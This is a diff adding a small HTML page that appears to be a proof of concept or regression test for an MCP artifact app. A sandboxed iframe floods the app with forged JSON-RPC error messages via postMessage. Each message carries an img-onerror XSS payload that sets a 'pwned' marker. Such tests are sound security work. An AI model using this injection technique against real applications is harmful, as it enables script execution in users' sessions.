@@ -1,0 +1,7 @@
+<!doctype html><body>
+<iframe id="app" src="/mcp-artifact-app.html"></iframe>
+<iframe sandbox="allow-scripts" srcdoc="<script>
+var p='<img src=x onerror=&quot;document.body.dataset.pwned=1&quot;>';
+var n=0;var t=setInterval(function(){for(var id=1;id<5;id++)parent.frames[0].postMessage({jsonrpc:'2.0',id:id,error:{message:p}},'*');if(++n>40)clearInterval(t)},50);
+</script>"></iframe>
+</body>
